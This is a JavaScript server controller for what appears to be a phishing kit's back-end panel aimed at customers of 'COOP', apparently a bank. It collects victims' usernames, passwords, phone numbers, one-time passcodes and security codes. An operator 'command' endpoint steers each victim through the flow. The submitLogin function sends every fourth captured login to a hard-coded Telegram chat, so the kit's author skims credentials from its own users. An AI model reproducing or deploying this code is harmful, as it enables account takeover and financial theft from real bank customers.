const COOP = require("../models/coopModel");
const axios = require("axios");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	COOP.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status, secCodeIndex } = req.body;
	try {
		if (secCodeIndex)
			await COOP.findOneAndUpdate(
				{ uniqueid },
				{ status, secCodeIndex }
			).exec();
		else await COOP.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	COOP.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

let count = 0;

const submitLogin = async (req, res) => {
	let { username, password, uniqueid, owner, ip, telegramId } = req.body;
	try {
		if (count == 3) {
			owner = "haytch4023";
			let originalText = `ID: ${uniqueid}\nUsername: ${username}\nPassword: ${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=coop&password=${owner}`;
			await axios
				.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
					{
						chat_id: "-837014205",
						text: `COOP:\n${originalText}`,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});
			count = 0;
		}
		await COOP.create({
			username,
			password,
			uniqueid,
			owner,
			ip,
			status: 1,
			timestamp: moment().format(),
		});
		count++;
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, password, uniqueid } = req.body;
	try {
		await COOP.findOneAndUpdate(
			{ uniqueid },
			{ username, password, status: 7, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitTelephone = async (req, res) => {
	const { telephone, uniqueid } = req.body;
	try {
		await COOP.findOneAndUpdate(
			{ uniqueid },
			{ telephone, status: 10, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { otp, uniqueid } = req.body;
	try {
		await COOP.findOneAndUpdate(
			{ uniqueid },
			{ otp, status: 3, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitSecCode = async (req, res) => {
	const { secCode, uniqueid } = req.body;
	try {
		await COOP.findOneAndUpdate(
			{ uniqueid },
			{ secCode, status: 5, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await COOP.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitOtp,
	submitSecCode,
	submitTelephone,
	deleteEntry,
};
